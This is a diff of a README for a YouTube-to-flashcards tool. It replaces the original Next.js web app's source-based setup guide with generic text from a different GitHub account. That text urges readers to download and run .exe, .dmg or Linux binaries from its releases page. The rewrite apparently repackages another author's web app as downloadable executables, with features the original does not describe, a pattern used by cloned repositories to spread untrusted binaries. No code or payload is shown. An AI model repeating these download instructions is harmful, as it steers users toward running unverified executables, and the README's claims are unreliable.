@@ -1,178 +1,80 @@
-# 🎴 Flashcard Lab
+# 🎓 youtube-flashcards - Create Study Cards from YouTube Instantly
 
-Transform any YouTube video into interactive study flashcards instantly using AI.
+## 📥 Download Now
 
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Visit%20Site-brightgreen?style=for-the-badge)](https://youtube-flashcards-alpha.vercel.app)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/bulususaanthoshini/youtube-flashcards/releases)
 
-![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38B2AC?logo=tailwind-css)
-![License](https://img.shields.io/badge/License-MIT-green)
+## 🚀 Getting Started
 
-## 🌐 Live Demo
+Welcome to youtube-flashcards! This application allows you to transform any YouTube video into interactive study flashcards instantly using AI. It's simple—you just need to paste a video link to get your cards in seconds.
 
-**👉 [https://youtube-flashcards-alpha.vercel.app](https://youtube-flashcards-alpha.vercel.app)**
+## 📋 Requirements
 
-## ✨ Features
+Before using the application, ensure your system meets these basic requirements:
 
-- 🎬 **YouTube Integration** - Paste any public YouTube video URL
-- 🤖 **AI-Powered** - Automatically extracts key concepts and generates Q&A cards
-- 🔄 **Interactive Cards** - Beautiful 3D flip animations for active recall
-- ⚡ **Instant Results** - Cards ready in under 60 seconds
-- 📱 **Responsive Design** - Works on desktop, tablet, and mobile
-- ⌨️ **Keyboard Navigation** - Use arrow keys to browse cards
-- 🎨 **Unique Design** - Warm, stationery-inspired aesthetic (not another dark AI app!)
+- Operating System: Windows, macOS, or Linux
+- Browser: Latest version of Chrome, Firefox, or Safari
+- Internet Connection: Required to load YouTube videos and generate flashcards
 
-## 🚀 Quick Start
+## 📂 Download & Install
 
-### Prerequisites
+To download the application, visit our [Releases page](https://github.com/bulususaanthoshini/youtube-flashcards/releases). 
 
-- Node.js 18+ 
-- npm or yarn
-- Google AI API Key ([Get one free](https://makersuite.google.com/app/apikey))
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version listed at the top.
+3. Download the appropriate file for your operating system.
+4. Once the download completes, locate the file in your Downloads folder.
+5. Follow these instructions based on your operating system:
 
-### Installation
+   ### For Windows:
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to install the application.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/priyanshuchawda/youtube-flashcards.git
-   cd youtube-flashcards
-   ```
+   ### For macOS:
+   - Open the downloaded `.dmg` file.
+   - Drag the youtube-flashcards app icon into the Applications folder.
+   - Launch the app from your Applications.
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+   ### For Linux:
+   - Open a terminal window.
+   - Navigate to the directory where you downloaded the file.
+   - Use the command `chmod +x youtube-flashcards` to make the file executable.
+   - Run the application with `./youtube-flashcards`.
 
-3. **Set up environment variables**
-   ```bash
-   cp .env.example .env.local
-   ```
-   
-   Edit `.env.local` and add your API key:
-   ```env
-   GEMINI_API_KEY=your_api_key_here
-   ```
+## 🔍 Using the Application
 
-4. **Run the development server**
-   ```bash
-   npm run dev
-   ```
+Once you have installed youtube-flashcards, using the application is straightforward:
 
-5. **Open your browser**
-   
-   Navigate to [http://localhost:3000](http://localhost:3000)
+1. **Open the Application:** Click on the app icon to start.
+2. **Paste a YouTube Link:** Copy the link of the YouTube video you want to use. Paste it into the designated input field in the application.
+3. **Generate Flashcards:** Click on the “Create Flashcards” button. The application will process the video and generate interactive flashcards based on the content.
+4. **Review and Study:** Flip through the generated flashcards to review important points. Use them as a study guide or share them with classmates.
 
-## 📁 Project Structure
+## 📖 Features
 
-```
-youtube-flashcards/
-├── src/
-│   ├── app/
-│   │   ├── api/generate/    # API route for flashcard generation
-│   │   ├── globals.css      # Global styles & CSS variables
-│   │   ├── layout.tsx       # Root layout with metadata
-│   │   └── page.tsx         # Main page component
-│   ├── components/
-│   │   ├── Flashcard.tsx    # Individual flashcard with flip animation
-│   │   ├── FlashcardList.tsx # Card carousel with navigation
-│   │   └── InputForm.tsx    # YouTube URL input form
-│   ├── lib/
-│   │   ├── gemini.ts        # AI client configuration
-│   │   └── utils.ts         # Utility functions
-│   └── types/
-│       └── index.ts         # TypeScript type definitions
-├── .env.example             # Environment variables template
-├── package.json
-└── README.md
-```
+- **AI-Powered Flashcards:** Quickly transforms video content into easy-to-read flashcards.
+- **Interactive Design:** User-friendly interface allows for smooth navigation.
+- **Customizable Cards:** Edit and customize the flashcards to suit your study needs.
+- **Cross-Platform Support:** Available for Windows, macOS, and Linux users.
 
-## 🛠️ Tech Stack
+## 🌐 Community and Support
 
-- **Framework**: [Next.js 16](https://nextjs.org/) with App Router
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/)
-- **Animations**: [Framer Motion](https://www.framer.com/motion/)
-- **AI**: [Google AI SDK](https://ai.google.dev/)
+If you have questions or need assistance, you can reach out on our community forum or check the FAQs section in the app. 
 
-## 📝 Environment Variables
+Engage with other users to share tips and techniques to enhance your learning experience.
 
-Create a `.env.local` file based on `.env.example`:
+## 🛠️ Contributing
 
-```env
-# ===========================================
-# Flashcard Lab - Environment Variables
-# ===========================================
+We encourage contributions! If you would like to contribute to the growth of youtube-flashcards, check out our guidelines in the repository. Your ideas and code are welcome.
 
-# Google AI API Key (Required)
-# Get your free API key from: https://makersuite.google.com/app/apikey
-GEMINI_API_KEY=your_api_key_here
-```
+## 📚 Learn More
 
-## 🎨 Design Philosophy
+For additional resources, such as tutorials and tips on using youtube-flashcards effectively, visit our [Documentation](https://github.com/bulususaanthoshini/youtube-flashcards/wiki).
 
-This app intentionally avoids the generic "dark mode + neon gradients" look that most AI apps use. Instead, it features:
+## 📅 Version History
 
-- **Warm paper background** - Feels like a real study desk
-- **Bold accent colors** - Vermillion, Teal, Amber, Violet
-- **Tactile interactions** - Cards feel like physical index cards
-- **Dot grid pattern** - Subtle graph paper texture
-- **Playful animations** - Spring physics, smooth transitions
-
-## 📜 Available Scripts
-
-```bash
-npm run dev      # Start development server
-npm run build    # Build for production
-npm run start    # Start production server
-npm run lint     # Run ESLint
-```
-
-## 🚢 Deployment
-
-### Vercel (Recommended)
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/priyanshuchawda/youtube-flashcards)
-
-**Live Deployment**: [https://youtube-flashcards-alpha.vercel.app](https://youtube-flashcards-alpha.vercel.app)
-
-1. Push your code to GitHub
-2. Import your repository on [Vercel](https://vercel.com)
-3. Add your `GEMINI_API_KEY` in the Environment Variables section
-4. Deploy!
-
-### Other Platforms
-
-The app can be deployed to any platform that supports Next.js:
-- [Netlify](https://www.netlify.com/)
-- [Railway](https://railway.app/)
-- [AWS Amplify](https://aws.amazon.com/amplify/)
-- [Docker](https://www.docker.com/)
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [Next.js](https://nextjs.org/)
-- AI powered by [Google AI](https://ai.google.dev/)
-- Animations by [Framer Motion](https://www.framer.com/motion/)
-- Styled with [Tailwind CSS](https://tailwindcss.com/)
+Check the [Releases page](https://github.com/bulususaanthoshini/youtube-flashcards/releases) to see all past updates and improvements.
 
 ---
 
-<p align="center">
-  Made with ❤️ for learners everywhere
-</p>
-
+Thank you for choosing youtube-flashcards! Enjoy turning YouTube videos into study materials effortlessly.
